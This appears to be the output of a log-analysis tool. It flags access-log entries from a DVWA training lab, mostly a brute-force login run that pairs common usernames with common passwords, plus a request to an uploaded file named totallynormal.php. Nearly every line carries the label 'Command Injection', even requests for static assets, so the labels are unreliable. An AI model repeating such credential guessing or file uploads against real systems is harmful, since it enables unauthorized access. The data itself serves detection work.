access.log.1,Command Injection,05/Apr/2024:15:15:44 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:52 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:16:43 +0000,-,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:39 +0000,/dvwa/css/login.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:40 +0000,/favicon.ico,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:40 +0000,/dvwa/images/login_logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/index.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/js/dvwaPage.js,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/css/main.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/images/logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:43 +0000,/dvwa/js/add_event_listeners.js,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:48 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:49 +0000,/dvwa/images/lock.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:51 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:20:52 +0000,/security.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:19 +0000,/vulnerabilities/fi/?page=include.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:21 +0000,/vulnerabilities/csrf/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:21 +0000,/vulnerabilities/upload/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:27 +0000,/vulnerabilities/upload/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:40 +0000,/vulnerabilities/fi/?page=include.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:41 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:48 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:21:55 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:15:22:13 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:22:26 +0000,/hackable/uploads/totallynormal.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:51 +0000,/vulnerabilities/exec/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:51 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:52 +0000,/dvwa/css/login.css,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:25:52 +0000,/dvwa/images/login_logo.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:28:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:29:48 +0000,-,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Error Codes,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Command Injection,05/Apr/2024:15:30:14 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log.1,Command Injection,05/Apr/2024:15:33:39 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:35:07 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:15:35:07 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:15:35:48 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:15:37:27 +0000,/,45.79.181.104,-
access.log.1,Command Injection,05/Apr/2024:15:54:14 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:14 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:54:39 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:07 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:07 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:24 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:25 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:30 +0000,/,192.155.88.231,-
access.log.1,Command Injection,05/Apr/2024:15:56:38 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:56:38 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:13 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:13 +0000,/login.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/?username=root&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/?username=admin&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:15 +0000,/vulnerabilities/brute/?username=test&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:16 +0000,/vulnerabilities/brute/?username=guest&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/?username=info&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/?username=adm&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:18 +0000,/vulnerabilities/brute/?username=mysql&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/?username=user&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/?username=administrator&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:20 +0000,/vulnerabilities/brute/?username=oracle&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/?username=ftp&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/?username=pi&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:22 +0000,/vulnerabilities/brute/?username=puppet&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/?username=ansible&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:24 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=123456&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/?username=root&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:26 +0000,/vulnerabilities/brute/?username=admin&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/?username=test&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/?username=guest&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:28 +0000,/vulnerabilities/brute/?username=info&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/?username=adm&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/?username=mysql&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:30 +0000,/vulnerabilities/brute/?username=user&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/?username=administrator&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/?username=oracle&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:32 +0000,/vulnerabilities/brute/?username=ftp&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/?username=pi&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=puppet&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=ansible&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/?username=root&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=admin&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=test&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/?username=guest&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=info&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=adm&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/?username=mysql&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=administrator&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/?username=oracle&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/?username=ftp&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=pi&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=puppet&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/?username=ansible&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=root&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=admin&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/?username=test&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=guest&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=info&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/?username=adm&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=mysql&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/?username=administrator&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=oracle&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=ftp&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/?username=pi&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=puppet&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=ansible&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=root&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=admin&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/?username=test&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/?username=guest&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:05 +0000,/vulnerabilities/brute/?username=info&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/?username=adm&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/?username=mysql&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/?username=user&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/?username=administrator&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:09 +0000,/vulnerabilities/brute/?username=oracle&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:09 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:10 +0000,/vulnerabilities/brute/?username=ftp&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/?username=pi&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/?username=puppet&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/?username=ansible&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:14 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:15 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/?username=root&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/?username=admin&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
